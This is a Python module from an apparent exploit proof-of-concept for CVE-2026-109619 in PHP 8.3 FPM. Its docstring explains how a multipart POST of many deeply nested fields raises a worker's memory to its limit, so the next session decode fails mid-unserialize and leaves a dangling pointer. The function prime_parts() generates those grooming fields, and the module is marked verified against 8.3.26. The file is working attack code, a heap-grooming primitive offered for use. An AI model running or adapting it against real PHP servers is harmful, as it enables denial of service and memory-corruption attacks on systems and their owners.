# INDEX: prime parse-peak so session decode ooms | fpm
"""Expensive-nested-field prime: lift a worker's parse-peak to ~memory_limit so the next session
decode OOMs and leaves BG(unserialize) dangling (CVE-2026-109619).

Mechanism (ext/standard/rfc1867.c, Zend/zend_variables.c php_var_unserialize; php-src 8.3):
  A POST of many deeply-nested $_POST fields raises the request's resident set to near memory_limit
  (~45-52 KB parse-peak per field on 8.3.x). A script-level session_start() in that same request then
  decodes an already-grown session file and tips into php_var_unserialize's OOM, skipping
  PHP_VAR_UNSERIALIZE_DESTROY while zend_first_try absorbs the fatal and the worker survives, leaving
  BG(unserialize) dangling.

API:
  prime_parts(count, levels=60, prefix=b"y") -> list of (name, value, filename) tuples for the
    caller's multipart transport. Composes nested_field_pressure.

Tested: 8.3.26-fpm; negative on 8.4.26 (the cheaper nested parse OOMs pre-RINIT).
Stage: VERIFIED 8.3.26.
"""
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.groom.nested_field_pressure import nested_fields  # noqa: E402


def prime_parts(count, levels=60, prefix=b"y"):
    """`count` deeply-nested $_POST prime fields (`levels` deep) that lift the parse-peak to
    ~memory_limit so the next session decode OOMs. Returns (name, value, filename) tuples."""
    return nested_fields(prefix, count, levels, None)
